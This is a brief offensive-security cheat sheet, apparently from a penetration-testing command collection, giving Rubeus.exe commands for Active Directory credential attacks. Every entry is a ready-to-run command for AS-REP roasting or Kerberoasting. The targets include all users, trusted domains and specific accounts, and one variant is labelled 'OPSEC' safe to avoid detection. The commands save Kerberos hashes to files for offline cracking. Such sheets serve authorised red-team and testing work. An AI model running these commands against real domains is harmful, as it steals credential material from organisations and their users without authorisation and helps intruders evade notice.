# rubeus

% ad, windows, rubeus

#plateform/windows #target/local 

## ASREPRoasting - for all users in current domain
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast  /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
```

## ASREPRoasting - for all users in a trusted domain
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast /domain:<domain_fqdn> /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
```

## ASREPRoasting - specific user
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast  /user:<user> /domain:<domain_fqdn> /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
```

## kerberoasting - current domain
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
```

## Kerberoasting - and outputting on a file with a spesific format
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_fqdn>
```

## Kerberoasting - while being "OPSEC" safe, essentially while not try to roast AES enabled accounts
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_fqdn> /rc4opsec
```

## Kerberoast - AES enabled accounts
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_fqdn> /aes
```
 
## Kerberoast - specific user account
#cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_fqdn> /user:<user> /simple
```